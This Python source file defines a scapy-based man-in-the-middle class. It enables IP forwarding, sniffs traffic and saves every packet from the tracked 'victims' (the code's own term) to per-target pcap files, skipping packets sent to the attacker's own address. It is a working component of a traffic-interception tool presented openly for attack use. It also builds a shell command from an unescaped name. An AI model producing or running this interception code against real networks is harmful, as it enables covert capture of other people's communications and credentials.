from scapy.layers.l2 import Ether
from scapy.all import *
import os
import threading

class Mitm:
    def __init__(self, interface, spyIp):
        self.interface = interface
        self.stationLinks = []
        self.spyIP = spyIp

    def enableIPForwarding(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("IP Forwarding Enabled.")

    def disableIPForwarding(self):
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("IP Forwarding Disabled.")

    def sniff(self):
        print("Setting Up Mitm...")
        self.enableIPForwarding()
        mitmThread = threading.Thread(target=self.sniffThread)
        mitmThread.start()

    def sniffThread(self):
        sniff(prn=self.handlePacket)

    def handlePacket(self, pkt):
        try:
            for link in self.stationLinks:
                if Ether in pkt and pkt[Ether].src in link.getMacs():  # checks if the sender of the packet is one of the victims
                    if IP in pkt and pkt[IP].dst == self.spyIP:  # filters out packets sent to this pc on purpose
                        return

                    # saves packets
                    os.system(f"touch ./{link}.pcap")
                    pktdump = PcapWriter(f"./{link}.pcap", append=True, sync=True)
                    pktdump.write(pkt)
                    return
        except Exception as e:
            print(e)
    def addStaLink(self, stationLink):
        for link in self.stationLinks:
            if link == stationLink:
                return
        print(f"Adding {stationLink} To Mitm.")
        self.stationLinks.append(stationLink)

    def delStaLink(self, stationLink):
        for link in self.stationLinks:
            if link == stationLink:
                print(f"Removing {stationLink} From Mitm.")
                self.stationLinks.remove(link)
                return